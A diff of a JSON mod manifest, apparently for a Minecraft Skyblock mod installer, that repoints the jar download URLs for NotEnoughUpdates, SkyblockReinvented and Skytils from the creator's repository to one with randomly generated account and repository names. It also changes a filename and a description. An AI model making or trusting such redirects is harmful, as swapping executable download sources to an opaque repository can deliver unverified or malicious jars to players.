@@ -286,7 +286,7 @@
         "id": "neu",
         "enabled": true,
         "file": "NotEnoughUpdates-2.0-PRE28.3.jar",
-        "url": "https://github.com/theCudster/bettermods/releases/download/v6.4.21/NotEnoughUpdates-1.7-REL-dep.jar",
+        "url": "https://github.com/Y4Me1MoDzv73VBDwHtIxiwSzE66tked8/JrSYOQggebWHSaLwcVvVDPmVdTHoDuma/releases/download/v6.4.21/NotEnoughUpdates-1.7-REL-dep.jar",
         "display": "NotEnoughUpdates",
         "description": "NEU is one of the essentials for playing Skyblock featuring remote AH, dungeon chest prices, missing enchants, list of all Skyblock items + recipes, and a lot more, \nwith even a ton coming in the near future!",
         "icon": "neulogo.png",
@@ -360,9 +360,9 @@
     {
         "id": "sre",
         "file": "sre-0.0.7-pre2.jar",
-        "url": "https://github.com/theCudster/bettermods/releases/download/v6.4.21/sre-0.0.7-pre2.jar",
+        "url": "https://github.com/Y4Me1MoDzv73VBDwHtIxiwSzE66tked8/JrSYOQggebWHSaLwcVvVDPmVdTHoDuma/releases/download/v6.4.21/sre-0.0.7-pre2.jar",
         "display": "SkyblockReinvented",
-        "description": "best mod :kekw:",
+        "description": "A helpful mod for removing chat messages and much more!",
         "icon": "skytils.png",
         "creator": "theCudster",
         "discordcode": "sre",
@@ -373,8 +373,8 @@
     }
     {
         "id": "skytils",
-        "file": "!!Skytils-1.0-pre11.1.jar",
-        "url": "https://github.com/theCudster/bettermods/releases/download/v6.4.21/Skytils-1.0-pre11.jar",
+        "file": "Skytils-1.0-pre11.jar",
+        "url": "https://github.com/Y4Me1MoDzv73VBDwHtIxiwSzE66tked8/JrSYOQggebWHSaLwcVvVDPmVdTHoDuma/releases/download/v6.4.21/Skytils-1.0-pre11.jar",
         "display": "Skytils",
         "description": "Introduces some useful puzzle solvers, a reparty command, spam hider for Skyblock, and a ton more with lots to come in the future!",
         "icon": "skytils.png",
